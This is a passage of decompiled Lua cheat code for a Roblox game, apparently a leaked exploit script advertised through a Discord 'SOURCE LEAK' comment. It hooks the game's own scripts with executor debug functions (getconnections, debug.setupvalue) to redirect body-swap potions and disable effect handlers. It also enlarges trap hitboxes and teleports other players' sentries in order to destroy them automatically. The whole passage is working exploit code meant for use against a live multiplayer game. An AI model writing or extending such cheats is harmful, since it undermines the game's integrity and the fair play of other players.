		for _, item29 in ipairs(result) do
			if item29.Enabled and type(item29.Fire) == "function" then
				if pcall(function()
					item29:Fire()
				end) then
					flag100 = true
					break
				end
			end
		end

		if not flag100 then
			return nil, "unavailable"
		end
		local now = os.clock()

		while true do
			local value127 = func118(childName2)

			if value127 then
				return value127
			else
				RunService.Heartbeat:Wait()
				if not (n <= os.clock() - now) then
					continue
				end
				break
			end
		end

		return func118(childName2), "cash"
	end

	local func120

	func120 = function(str17, flag101)
		local str18

		if flag101 == "rebirth" then
			str18 = "A higher Rebirth level is required for " .. str17 .. "."
		elseif flag101 == "cash" then
			str18 = "Not enough cash to buy " .. str17 .. "."
		else
			str18 = "Unable to buy " .. str17 .. " right now."
		end

		obj1.Notify("Tool unavailable", str18, 5)
	end

	local func121
	local n2 = 0

	func3 = function(param43)
		n2 = math.max(n2, os.clock() + (tonumber(param43) or 1))
	end

	func121 = function()
		return os.clock() < n2
	end

	do
		local n3 = 0.02
		local n4 = 5
		local n5 = 7
		local n6 = 5
		local n7 = 12
		local n8 = 4
		local n9 = 2
		local flag102 = false
		local flag103 = false
		local n10 = 0
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local value128 = nil
		local tbl33 = {}
		local n11 = 0
		local n12 = 0
		local value129 = nil
		local value130 = nil

		local function func122(player2)
			if not player2 then
				return nil
			end
			local character_ = player2.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			if humanoid and humanoid.Health > 0 and character_ then
				return character_
			end
			return nil
		end

		local function func123(part9)
			local value131 = nil
			local value132 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local value133 = func122(player)

					if value133 then
						local magnitude = (value133.Position - part9.Position).Magnitude

						if not value131 or magnitude < value131 then
							value131 = magnitude
							value132 = player
						end
					end
				end
			end

			return value132
		end

		local function func124()
			local character_ = localPlayer.Character
			return character_ and character_:FindFirstChild("Body Swap Potion") or localPlayer.Backpack:FindFirstChild("Body Swap Potion")
		end

		local function func125(param44, param45)
			local ok, result = pcall(getconnections, param44.Activated)
			if not ok then
				return
			end

			for _, item30 in ipairs(result) do
				local function_ = nil

				pcall(function()
					function_ = item30.Function
				end)

				if typeof(function_) == "function" then
					local ok2, result2 = pcall(debug.getinfo, function_)
					ok2 = ok2 and result2

					if ok2 then
						ok2 = string.find(result2.source or "", "BodySwapScript", 1, true)
					end

					if ok2 then
						local n13 = tonumber(result2.nups) or 0
						local flag104 = false

						for i_ = 1, n13 do
							local ok3, result3, result4 = pcall(debug.getupvalue, function_, i_)
							local foundAt = string.find(string.lower(tostring(result3 or "")), "target", 1, true) ~= nil
							local flag105 = typeof(result4) == "Instance" and result4:IsA("Player") and result4 ~= localPlayer
							foundAt = foundAt and (result4 == nil or typeof(result4) == "Instance" and result4:IsA("Player"))

							if ok3 and (foundAt or flag105) then
								flag104 = pcall(debug.setupvalue, function_, i_, param45) or flag104
							end
						end

						local flag106 = not flag104

						if flag106 then
							flag106 = (tonumber(result2.nups) or 0) >= 2
						end

						if flag106 then
							pcall(debug.setupvalue, function_, 2, param45)
						end
					end
				end
			end
		end

		local function func126(instance18)
			local list20 = {}

			for _, child in ipairs(instance18:GetChildren()) do
				if child:IsA("Tool") then
					list20[#list20 + 1] = child
				end
			end

			return list20
		end

		local function func127(list21)
			if not list21 then
				return
			end
			local flag107 = list21.PreviousToolStates[1]
			local bodySwapTool = list21.BodySwapTool

			if bodySwapTool and bodySwapTool.Parent then
				pcall(function()
					bodySwapTool:Deactivate()
					bodySwapTool.Enabled = true
					bodySwapTool.Parent = localPlayer.Backpack
				end)
			end

			for _, previousToolState in ipairs(list21.PreviousToolStates) do
				pcall(function()
					if previousToolState.Tool.Parent then
						previousToolState.Tool.Enabled = previousToolState.Enabled

						if previousToolState.Tool.Parent == character then
							previousToolState.Tool.Parent = localPlayer.Backpack
						end
					end
				end)
			end

			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not humanoid or humanoid.Health <= 0 then
				return
			end
			local tool = character_:FindFirstChildWhichIsA("Tool")
			-- SL | SOURCE LEAK | https://discord.gg/x7YbZeezpm

			if tool == bodySwapTool then
				pcall(function()
					bodySwapTool:Deactivate()
					bodySwapTool.Parent = localPlayer.Backpack
				end)

				tool = nil
			end

			if not tool and flag107 and flag107.Tool.Parent == localPlayer.Backpack then
				pcall(function()
					func3(0.5)
					humanoid:EquipTool(flag107.Tool)
				end)
			end
		end

		local function func128()
			local character_ = localPlayer.Character
			local result12 = func124()
			if not result12 or not result12.Parent then
				return
			end

			pcall(function()
				result12:Deactivate()
				result12.Enabled = true

				if result12.Parent == character_ then
					result12.Parent = localPlayer.Backpack
				end
			end)
		end

		local function func129(param46)
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local bodySwapPotion

			if character_ then
				bodySwapPotion = func124() or func119("Body Swap Potion")
			else
				bodySwapPotion = character_
			end

			if not character_ or not humanoid or not bodySwapPotion then
				return nil
			end
			func3(2)
			local list22 = {}

			for _, item31 in ipairs(func126(character_)) do
				if item31 ~= bodySwapPotion then
					list22[#list22 + 1] = { Tool = item31, Enabled = item31.Enabled }

					pcall(function()
						item31:Deactivate()
						item31.Enabled = false
						item31.Parent = localPlayer.Backpack
					end)
				end
			end

			humanoid:UnequipTools()
			func3(2)
			local n13 = os.clock() + 0.45

			while true do
				pcall(function()
					humanoid:EquipTool(bodySwapPotion)
				end)

				if bodySwapPotion.Parent == character_ then
					break
				else
					task.wait(0.03)
					if not (n13 <= os.clock()) then
						continue
					end
					break
				end
			end

			for _, item32 in ipairs(func126(character_)) do
				if item32 ~= bodySwapPotion then
					pcall(function()
						item32:Deactivate()
						item32.Parent = localPlayer.Backpack
					end)
				end
			end

			func125(bodySwapPotion, param46)

			return {
				Character = character_,
				Humanoid = humanoid,
				BodySwapTool = bodySwapPotion,
				PreviousToolStates = list22,
				StartedAt = os.clock(),
			}
		end

		local function func130(num11, param47, flag108)
			if flag103 then
				return
			end
			flag103 = true
			local flag109 = n10

			task.spawn(function()
				local value134 = nil

				local ok = pcall(function()
					local n13 = flag108 and n7 + 3 or 12
					local n14 = os.clock() + n13
					local flag110 = param47

					while true do
						if flag102 and n10 == flag109 and os.clock() < n14 then
							local flag111 = func122(localPlayer)

							if not flag111 then
								task.wait(0.08)
								continue
							elseif not ((flag111.Position - num11).Magnitude <= n6) then
								local flag112 = value134

								if value134 then
									local startedAt = value134.StartedAt
									flag112 = os.clock() - startedAt >= n8
								end

								if not flag112 then
									if not flag110 or not func122(flag110) then
										flag110 = func123(flag111)
									end

									if not flag110 then
										task.wait(0.08)
										continue
									else
										local character_, humanoid, bodySwapTool, tool

										if not value134 or localPlayer.Character ~= value134.Character or not value134.BodySwapTool.Parent then
											func127(value134)
											value129 = nil
											value134 = func129(flag110)
											value129 = value134

											if not value134 then
												task.wait(0.12)
												continue
											else
												character_ = value134.Character
												humanoid = value134.Humanoid
												bodySwapTool = value134.BodySwapTool
												tool = character_:FindFirstChildWhichIsA("Tool")
												tool = tool and tool ~= bodySwapTool

												if not tool then
													if bodySwapTool.Parent ~= character_ then
														pcall(function()
															func3(1)
															humanoid:EquipTool(bodySwapTool)
														end)
													end

													if bodySwapTool.Parent == character_ then
														func125(bodySwapTool, flag110)

														if bodySwapTool.Enabled ~= false then
															pcall(function()
																bodySwapTool:Deactivate()
																bodySwapTool:Activate()
															end)
														end
													end

													task.wait(0.08)
													continue
												end
											end
										else
											character_ = value134.Character
											humanoid = value134.Humanoid
											bodySwapTool = value134.BodySwapTool
											tool = character_:FindFirstChildWhichIsA("Tool")
											tool = tool and tool ~= bodySwapTool

											if not tool then
												if bodySwapTool.Parent ~= character_ then
													pcall(function()
														func3(1)
														humanoid:EquipTool(bodySwapTool)
													end)
												end

												if bodySwapTool.Parent == character_ then
													func125(bodySwapTool, flag110)
													-- SOURCE LEAK (SL) | https://discord.gg/x7YbZeezpm

													if bodySwapTool.Enabled ~= false then
														pcall(function()
															bodySwapTool:Deactivate()
															bodySwapTool:Activate()
														end)
													end
												end

												task.wait(0.08)
												continue
											end
										end
									end
								end
							end
						end

						break
					end
				end)

				func127(value134)

				if value129 == value134 then
					value129 = nil
				end

				func128()
				task.wait(0.2)

				if n10 == flag109 then
					flag103 = false

					if value130 then
						value130()
					end

					if not ok then
						func128()
					end
				end
			end)
		end

		value130 = function()
			value128 = nil
			table.clear(tbl33)
			n11 = 0
		end

		local function func131(deltaTime)
			if localPlayer:GetAttribute("Stealing") == true then
				n12 = os.clock() + n9
			end

			n11 += deltaTime
			if n11 < n3 then
				return
			end
			n11 = 0
			local flag113 = func122(localPlayer)
			if not flag113 then
				value130()
				return
			end
			local position = flag113.Position

			if value128 and not flag103 then
				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= localPlayer then
						local flag114 = func122(player)
						local entry9 = tbl33[player]

						if flag114 and entry9 then
							local position2 = flag114.Position
							if (position - value128).Magnitude >= n4 and (position2 - entry9).Magnitude >= n4 and (position - entry9).Magnitude <= n5 and (position2 - value128).Magnitude <= n5 then
								func130(value128, player, localPlayer:GetAttribute("Stealing") == true or os.clock() <= n12)
								break
							end
						end
					end
				end
			end

			value128 = position

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local flag115 = func122(player)
					tbl33[player] = flag115 and flag115.Position or nil
				end
			end
		end

		local function func132()
			local value135 = flag103
			local flag116

			if flag103 then
				flag116 = value135
			else
				flag116 = value129 ~= nil
			end

			local value136 = value129
			value129 = nil
			flag102 = false
			flag103 = false
			n10 += 1
			func127(value136)

			if flag116 then
				func128()
			end

			value130()

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end
		end

		local function func133()
			func132()
			flag102 = true
			value130()
			local bodySwapPotion, value137 = func119("Body Swap Potion")

			if not bodySwapPotion then
				func120("Body Swap Potion", value137)
			end

			connection2 = localPlayer.CharacterAdded:Connect(function()
				n10 += 1
				local value138 = value129
				value129 = nil
				func127(value138)
				flag103 = false
				value130()
				task.defer(func128)
			end)

			connection3 = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
				if localPlayer:GetAttribute("Stealing") == true then
					n12 = os.clock() + n9
				end
			end)

			if localPlayer:GetAttribute("Stealing") == true then
				n12 = os.clock() + n9
			end

			connection = RunService.Heartbeat:Connect(func131)
			return true
		end

		func2(func132)

		obj15:CreateToggle({
			Name = "Anti Body Swap",
			Default = true,
			Callback = function(value)
				if value then
					func133()
				else
					func132()
				end
			end,
		})
	end

	do
		local flag117 = false
		local list23 = {}
		local list24 = {}
		local list25 = {}
		local obj2 = setmetatable({}, { __mode = "k" })
		local obj3 = setmetatable({}, { __mode = "k" })
		local obj4 = setmetatable({}, { __mode = "k" })
		local obj5 = setmetatable({}, { __mode = "k" })
		local obj6 = setmetatable({}, { __mode = "k" })
		local value139 = nil
		local moveFunction = nil
		local move = nil
		local moveFunction2 = nil
		local n3 = 0
		local n4 = 0
		local currentCamera = nil
		local humanoid = nil
		local flag118 = false
		local vector = Vector3.zero
		local byName = { Blue = true, DiscoEffect = true, BeeBlur = true, ColorCorrection = true }
		local value140 = nil
		local value141 = nil

		local function func134(list26)
			for _, item33 in ipairs(list26) do
				if typeof(item33) == "RBXScriptConnection" then
					item33:Disconnect()
				end
			end

			table.clear(list26)
		end

		local value142 = nil

		value142 = function(param48, num12, tbl34)
			if typeof(param48) ~= "function" or num12 > 3 or tbl34[param48] then
				return false
			end
			tbl34[param48] = true
			local ok, result = pcall(debug.getconstants, param48)
			local flag119 = false
			local flag120 = false
			local flag121 = false

			if ok then
				for _, item34 in ipairs(result) do
					if type(item34) == "string" then
						local lowered4 = string.lower(item34)

						if string.find(lowered4, "discoeffect", 1, true) then
							flag120 = true
						end

						if string.find(lowered4, "boogie", 1, true) then
							flag119 = true
						end

						if lowered4 == "fieldofview" then
							flag121 = true
						end
					end
				end
			end

			if flag120 and (flag119 or flag121) then
				return true
			end
			local ok2, result2 = pcall(debug.getprotos, param48)

			if ok2 then
				for _, item35 in ipairs(result2) do
					if value142(item35, num12 + 1, tbl34) then
						return true
					end
				end
			end

			return false
		end

		local function func135(param49)
			local enabled = nil

			return pcall(function()
				enabled = param49.Enabled
			end) and enabled == true
		end

		local function func136(param50)
			if typeof(param50) ~= "function" then
				return false
			end
			local ok, result = pcall(debug.info, param50, "s")
			return ok and type(result) == "string" and string.find(string.lower(result), "paintballguncontroller", 1, true) ~= nil
		end

		local function func137(obj35)
			if not flag117 or not flag1 then
				return
			end

			if func135(obj35) then
				if pcall(function()
					obj35:Disable()
				end) then
					obj5[obj35] = true
				end
			end
		end

		local function func138(instance19)
			if not flag117 or not flag1 or not instance19 or not instance19.Parent or not instance19:IsA("RemoteEvent") then
				return
			end
			local ok, result = pcall(getconnections, instance19.OnClientEvent)

			if ok then
				for _, item36 in ipairs(result) do
					if not obj6[item36] then
						obj6[item36] = true
						local function_ = nil

						pcall(function()
							function_ = item36.Function
						end)

						if value142(function_, 1, {}) or func136(function_) then
							obj4[item36] = true
							func137(item36)
						end
					end
				end
			end
		end

		local function func139()
			n4 += 1
			local flag122 = n4

			task.spawn(function()
				local list27 = { { Object = Lighting, Kind = "Lighting" }, { Object = ReplicatedStorage, Kind = "Remotes" } }
				local playerScripts = localPlayer:FindFirstChild("PlayerScripts")

				if playerScripts then
					list27[#list27 + 1] = { Object = playerScripts, Kind = "Sounds" }
				end

				local n5 = 1

				while flag117 and flag1 and n4 == flag122 and n5 <= #list27 do
					local now = os.clock()
					local n6 = 0

					while true do
						local entry10 = list27[n5]
						n5 += 1
						local object = entry10.Object

						if object and object.Parent then
							if entry10.Kind == "Lighting" then
								value140(object)
							elseif entry10.Kind == "Sounds" then
								value141(object)
							elseif entry10.Kind == "Remotes" and object:IsA("RemoteEvent") then
								func138(object)
							end

							local tbl35 = {}

							pcall(function()
								tbl35 = object:GetChildren()
							end)

							for _, item37 in ipairs(tbl35) do
								list27[#list27 + 1] = { Object = item37, Kind = entry10.Kind }
							end
						end

						n6 += 1
						if not (n5 > #list27 or n6 >= 20 or os.clock() - now >= 0.0015) then
							continue
						end
						break
					end

					if n5 <= #list27 then
						RunService.Heartbeat:Wait()
					end
				end
			end)
		end

		local function func140()
			for k in pairs(obj5) do
				pcall(function()
					if not k.Enabled then
						k:Enable()
					end
				end)
			end

			table.clear(obj5)
			table.clear(obj4)
			table.clear(obj6)
		end

		value140 = function(instance20)
			if instance20 and instance20.Parent and byName[instance20.Name] then
				pcall(function()
					instance20:Destroy()
				end)
			end
		end

		local function func141()
			return localPlayer:GetAttribute("ChilliTpMoving") == true or localPlayer:GetAttribute("Teleporting") == true
		end

		value141 = function(instance21)
			if not instance21 or not instance21:IsA("Sound") or instance21.Name ~= "Buzzing" then
				return
			end

			if obj3[instance21] == nil then
				obj3[instance21] = instance21.Volume
			end

			local flag123 = false

			local function func142()
				if flag123 or not flag117 or not instance21.Parent then
					return
				end
				flag123 = true

				pcall(function()
					if instance21.Playing then
						instance21:Stop()
					end

					if instance21.Volume ~= 0 then
						instance21.Volume = 0
					end
				end)

				flag123 = false
			end

			func142()
			if obj2[instance21] then
				return
			end
			obj2[instance21] = true
			list24[#list24 + 1] = instance21:GetPropertyChangedSignal("Volume"):Connect(func142)
			list24[#list24 + 1] = instance21:GetPropertyChangedSignal("Playing"):Connect(func142)
		end

		local function func143()
			if flag118 or not flag117 then
				return
			end
			flag118 = true

			pcall(function()
				if currentCamera and currentCamera.Parent and currentCamera.FieldOfView ~= 70 then
					currentCamera.FieldOfView = 70
				end

				if humanoid and humanoid.Parent and humanoid.CameraOffset ~= vector then
					humanoid.CameraOffset = vector
				end
			end)

			flag118 = false
		end

		local function func144()
			func134(list25)
			currentCamera = Workspace.CurrentCamera
			local character_ = localPlayer.Character
			humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			func143()

			if currentCamera then
				list25[#list25 + 1] = currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(func143)
			end

			if humanoid then
				list25[#list25 + 1] = humanoid:GetPropertyChangedSignal("CameraOffset"):Connect(func143)
			end
		end

		local function func145()
			func134(list25)
			currentCamera = nil
			humanoid = nil
			flag118 = false
		end

		local function func146()
			if value139 then
				pcall(function()
					value139.moveFunction = move or moveFunction
				end)
			end

			value139 = nil
			moveFunction = nil
			move = nil
			moveFunction2 = nil
		end

		local function func147()
			if value139 and moveFunction2 then
				if value139.moveFunction ~= moveFunction2 then
					value139.moveFunction = moveFunction2
				end

				return
			end

			pcall(function()
				local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
				playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")
				if not playerScripts then
					return
				end
				local controls = require(playerScripts):GetControls()
				if not controls then
					return
				end
				value139 = controls
				moveFunction = controls.moveFunction
				move = localPlayer.Move

				moveFunction2 = function(param51, param52, param53)
					return localPlayer:Move(param52, param53)
				end

				value139.moveFunction = moveFunction2
			end)
		end

		local function func148()
			func134(list24)

			for k, value143 in pairs(obj3) do
				if k and k.Parent then
					pcall(function()
						k.Volume = value143
					end)
				end
			end

			table.clear(obj2)
			table.clear(obj3)
		end

		local function func149()
			flag117 = false
			n3 += 1
			n4 += 1
			func134(list23)
			func140()
			func145()
			func146()
			func148()
		end

		local function func150()
			func149()
			flag117 = true
			n3 += 1
			local value144 = n3
			func147()
			func144()
			func139()

			list23[#list23 + 1] = Lighting.DescendantAdded:Connect(function(descendant)
				if flag117 then
					value140(descendant)
				end
			end)

			list23[#list23 + 1] = ReplicatedStorage.DescendantAdded:Connect(function(descendant)
				if flag117 and descendant:IsA("RemoteEvent") then
					task.defer(function()
						func138(descendant)
					end)

					task.delay(0.5, function()
						func138(descendant)
					end)
				end
			end)

			local playerScripts = localPlayer:FindFirstChild("PlayerScripts")

			if playerScripts then
				list23[#list23 + 1] = playerScripts.DescendantAdded:Connect(function(descendant)
					if flag117 then
						value141(descendant)
					end
				end)
			end

			list23[#list23 + 1] = Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				if flag117 then
					func144()
				end
			end)

			list23[#list23 + 1] = localPlayer.CharacterAdded:Connect(function(character_)
				task.spawn(function()
					character_:WaitForChild("Humanoid", 5)

					if flag117 and character_ == localPlayer.Character then
						func144()
					end
				end)
			end)

			task.spawn(function()
				while true do
					if flag117 and flag1 and n3 == value144 then
						task.wait(0.1)

						if not (not flag117 or not flag1 or n3 ~= value144) then
							if not func141() then
								func147()
							end

							continue
						end
					end

					break
				end
			end)
		end

		func2(func149)

		obj15:CreateToggle({
			Name = "Anti Bee, Disco & Paintball Effect",
			Default = true,
			Callback = function(value)
				if value then
					func150()
				else
					func149()
				end
			end,
		})
	end

	do
		local n3 = 1.06
		local vector = Vector3.new(2.9, 1.15, 2.9)
		local color = Color3.fromRGB(255, 45, 45)
		local flag124 = false
		local connection = nil
		local connection2 = nil
		local tbl36 = {}

		local function func151(instance22)
			return instance22:IsA("Model") and instance22.Name:match("^Trap") ~= nil
		end

		local function func152(instance23, childName3)
			local obj36 = instance23:FindFirstChild(childName3)
			if obj36 and obj36:IsA("BasePart") then
				return obj36
			end

			for _, descendant in ipairs(instance23:GetDescendants()) do
				if descendant.Name == childName3 and descendant:IsA("BasePart") then
					return descendant
				end
			end

			return nil
		end

		local function func153(param54)
			local entry11 = tbl36[param54]
			if not entry11 then
				return
			end
			tbl36[param54] = nil

			if entry11.Connection then
				pcall(function()
					entry11.Connection:Disconnect()
				end)
			end

			for _, propertyConnection in ipairs(entry11.PropertyConnections) do
				pcall(function()
					propertyConnection:Disconnect()
				end)
			end

			table.clear(entry11.PropertyConnections)

			if entry11.Outline then
				pcall(function()
					entry11.Outline:Destroy()
				end)
			end

			if entry11.Target and entry11.Target.Parent then
				pcall(function()
					entry11.Target.Size = entry11.OriginalSize
					entry11.Target.CFrame = entry11.OriginalCFrame
					entry11.Target.CanCollide = entry11.OriginalCanCollide
					entry11.Target.CanTouch = entry11.OriginalCanTouch
				end)
			end
		end

		local function func154()
			for k in pairs(tbl36) do
				func153(k)
			end

			table.clear(tbl36)
		end

		local function func155(obj37, num13)
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not character_ then
				return false
			end
			local value145 = obj37:PointToObjectSpace(character_.Position)
			local n4 = num13 * 0.5
			local x = n4.X
			local flag125 = math.abs(value145.X) <= x

			if flag125 then
				local y = n4.Y
				flag125 = math.abs(value145.Y) <= y
			end

			if flag125 then
				local z = n4.Z
				flag125 = math.abs(value145.Z) <= z
			end

			return flag125
		end

		local function func156(obj38)
			if not flag124 or tbl36[obj38] then
				return
			end
			local open = func152(obj38, "Open")
			local close = func152(obj38, "Close")
			if not open or not close then
				return
			end
			local boundingBox, num14 = obj38:GetBoundingBox()
			local n4 = num14 * n3 + vector
			local n5 = math.max(n4.X, n4.Z)
			local vector2 = Vector3.new(n5, n4.Y, n5)
			if func155(open.CFrame, vector2) then
				return
			end

			local tbl37 = {
				Target = close,
				OriginalSize = close.Size,
				OriginalCFrame = close.CFrame,
				OriginalCanCollide = close.CanCollide,
				OriginalCanTouch = close.CanTouch,
				PropertyConnections = {},
			}

			tbl36[obj38] = tbl37
			local flag126 = false

			local function func157()
				if flag126 or not flag124 or not close.Parent or not open.Parent then
					return
				end
				flag126 = true

				pcall(function()
					close.Size = vector2
					close.CFrame = open.CFrame
					close.CanCollide = true
					close.CanTouch = false
				end)

				flag126 = false
			end

			func157()
			tbl37.PropertyConnections[#tbl37.PropertyConnections + 1] = close:GetPropertyChangedSignal("Size"):Connect(func157)
			tbl37.PropertyConnections[#tbl37.PropertyConnections + 1] = close:GetPropertyChangedSignal("CFrame"):Connect(func157)
			tbl37.PropertyConnections[#tbl37.PropertyConnections + 1] = close:GetPropertyChangedSignal("CanCollide"):Connect(func157)
			tbl37.PropertyConnections[#tbl37.PropertyConnections + 1] = close:GetPropertyChangedSignal("CanTouch"):Connect(func157)
			tbl37.PropertyConnections[#tbl37.PropertyConnections + 1] = open:GetPropertyChangedSignal("CFrame"):Connect(func157)
			local selectionBox = Instance.new("SelectionBox")
			selectionBox.Name = func1()
			selectionBox.Adornee = close
			selectionBox.Archivable = false
			selectionBox.Color3 = color
			selectionBox.LineThickness = 0.03
			selectionBox.SurfaceTransparency = 1
			selectionBox.Transparency = 0
			selectionBox.Parent = close
			tbl37.Outline = selectionBox

			tbl37.Connection = obj38.AncestryChanged:Connect(function(child, parent)
				if not parent then
					func153(obj38)
				end
			end)
		end

		local function func158()
			for _, child in ipairs(Workspace:GetChildren()) do
				if func151(child) then
					func156(child)
				end
			end
		end

		local function func159()
			flag124 = false

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection then
				connection:Disconnect()
				connection = nil
			end

			func154()
		end

		local function func160()
			func159()
			flag124 = true
			func158()

			connection2 = Workspace.ChildAdded:Connect(function(child)
				if not flag124 or not func151(child) then
					return
				end

				task.defer(function()
					if flag124 and child.Parent then
						func156(child)
					end
				end)
			end)

			connection = localPlayer.CharacterAdded:Connect(function()
				if flag124 then
					task.defer(func158)
				end
			end)
		end

		func2(func159)

		obj15:CreateToggle({
			Name = "Anti Trap",
			Default = true,
			Callback = function(value)
				if value then
					func160()
				else
					func159()
				end
			end,
		})
	end

	do
		local flag127 = false
		local n3 = 0
		local connection = nil
		local tbl38 = {}
		local tbl39 = {}
		local value146 = nil
		local value147 = nil
		local n4 = 0
		local str19 = "Sentry_" .. tostring(localPlayer.UserId)

		local function func161(instance24)
			local isModel

			if instance24 then
				isModel = instance24:IsA("Model") or instance24:IsA("BasePart")
			else
				isModel = instance24
			end

			return isModel and instance24.Name:match("^Sentry_") ~= nil and instance24.Name ~= str19
		end

		local function func162(instance25)
			if instance25:IsA("BasePart") then
				return instance25
			end
			return instance25:FindFirstChildWhichIsA("BasePart", true)
		end

		local function func163(instance26)
			return instance26:FindFirstChild("SetupReady", true) ~= nil
		end

		local function func164(obj39)
			obj39 = obj39 and obj39:FindFirstChildWhichIsA("Tool")
			if obj39 and obj39.Name:lower():find("bat", 1, true) then
				return obj39
			end
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			if not backpack then
				return nil
			end

			for _, child in ipairs(backpack:GetChildren()) do
				if child:IsA("Tool") and child.Name:lower():find("bat", 1, true) then
					return child
				end
			end

			return nil
		end

		local function func165()
			local flag128 = value146
			local value148 = value147
			value146 = nil
			value147 = nil
			if not flag128 or not flag128.Parent then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			if not character_ or not humanoid or humanoid.Health <= 0 or flag128.Parent ~= character_ and flag128.Parent ~= backpack then
				return
			end
			local tool = character_:FindFirstChildWhichIsA("Tool")
			if tool == flag128 then
				return
			end

			if tool and tool ~= value148 then
				return
			end

			pcall(function()
				func3(0.5)
				humanoid:EquipTool(flag128)
			end)
		end

		local function func166()
			return localPlayer:GetAttribute("Stealing") == true or localPlayer:GetAttribute("ChilliTpMoving") == true or localPlayer:GetAttribute("Teleporting") == true
		end

		local function func167(param55)
			if not tbl39[param55] then
				tbl39[param55] = { CanCollide = param55.CanCollide, Transparency = param55.Transparency, Size = param55.Size }
			end

			param55.CanCollide = false
			param55.Transparency = 1
			param55.Size = Vector3.new(10, 10, 10)
		end

		local function func168()
			for k, value149 in pairs(tbl39) do
				if k and k.Parent then
					pcall(function()
						k.CanCollide = value149.CanCollide
						k.Transparency = value149.Transparency
						k.Size = value149.Size
					end)
				end
			end

			tbl39 = {}
		end

		local function func169()
			if func166() then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not humanoid or humanoid.Health <= 0 or not humanoidRootPart then
				return
			end
			local value150 = nil
			local huge = math.huge
			local value151 = nil

			for k in pairs(tbl38) do
				if not k.Parent then
					tbl38[k] = nil
				elseif func163(k) then
					local num15 = func162(k)

					if num15 then
						local magnitude = (humanoidRootPart.Position - num15.Position).Magnitude

						if magnitude < huge then
							value150 = num15
							huge = magnitude
							value151 = k
						end
					end
				end
			end

			if not value151 or not value151.Parent or not value150 or not value150.Parent then
				return
			end

			pcall(function()
				func167(value150)
				value150.CFrame = humanoidRootPart.CFrame
			end)

			local obj40 = func164(character_)
			if not obj40 then
				return
			end

			if obj40.Parent ~= character_ then
				local tool = character_:FindFirstChildWhichIsA("Tool")

				if tool and tool ~= obj40 and not value146 then
					value146 = tool
				end

				value147 = obj40

				pcall(function()
					func3(1)
					humanoid:EquipTool(obj40)
				end)
			end

			if obj40.Parent == character_ then
				n4 = os.clock()

				pcall(function()
					obj40:Activate()
				end)
			end
		end

		local function func170()
			flag127 = false
			n3 += 1
			n4 = 0
			func165()

			if connection then
				connection:Disconnect()
				connection = nil
			end

			tbl38 = {}
			func168()
		end

		local function func171()
			func170()
			flag127 = true
			n3 += 1
			local flag129 = n3

			for _, descendant in ipairs(Workspace:GetDescendants()) do
				if func161(descendant) then
					tbl38[descendant] = true
				end
			end

			connection = Workspace.DescendantAdded:Connect(function(descendant)
				if flag127 and func161(descendant) then
					tbl38[descendant] = true
				end
			end)

			func169()

			task.spawn(function()
				local num16 = n4

				while flag127 and n3 == flag129 and flag1 do
					if not func166() then
						local character_ = localPlayer.Character
						local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
						local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")

						if humanoid and humanoid.Health > 0 and humanoidRootPart then
							local value152 = nil
							local huge = math.huge
							local value153 = nil

							for k in pairs(tbl38) do
								if not k.Parent then
									tbl38[k] = nil
								elseif func163(k) then
									local num17 = func162(k)

									if num17 then
										local magnitude = (humanoidRootPart.Position - num17.Position).Magnitude

										if magnitude < huge then
											value152 = num17
											huge = magnitude
											value153 = k
										end
									end
								end
							end

							if value153 and value153.Parent and value152 and value152.Parent then
								pcall(function()
									func167(value152)
									value152.CFrame = humanoidRootPart.CFrame
								end)

								local now = os.clock()

								if now - num16 >= 0.01 then
									local obj41 = func164(character_)

									if obj41 then
										if obj41.Parent ~= character_ then
											local tool = character_:FindFirstChildWhichIsA("Tool")

											if tool and tool ~= obj41 and not value146 then
												value146 = tool
											end

											value147 = obj41

											pcall(function()
												func3(1)
												humanoid:EquipTool(obj41)
											end)
										end

										if obj41.Parent == character_ then
											pcall(function()
												obj41:Activate()
											end)
										end
									end

									num16 = now
								end
							else
								func165()
							end
						end
					else
						func165()
					end

					task.wait()
				end
			end)
		end

		func2(func170)

		obj15:CreateToggle({
			Name = "Auto Destroy Turrets",
			Default = true,
			Callback = function(value)
				if value then
					func171()
				else
					func170()
				end
			end,
		})
	end

	do
		local n3 = 0.6
		local n4 = 2
		local n5 = 0.2
		local n6 = 0.6
		local n7 = 1.5
		local flag130 = false

		local function func172()
			local character_ = localPlayer.Character
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			return character_ and character_:FindFirstChild("Quantum Cloner") or backpack and backpack:FindFirstChild("Quantum Cloner")
		end

		local function func173(instance27)
			local character_ = localPlayer.Character
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not backpack or not humanoid or humanoid.Health <= 0 then
				return false
			end
			func3(5)

			for _, child in ipairs(character_:GetChildren()) do
				if child:IsA("Tool") and child ~= instance27 then
					pcall(function()
						child:Deactivate()
					end)

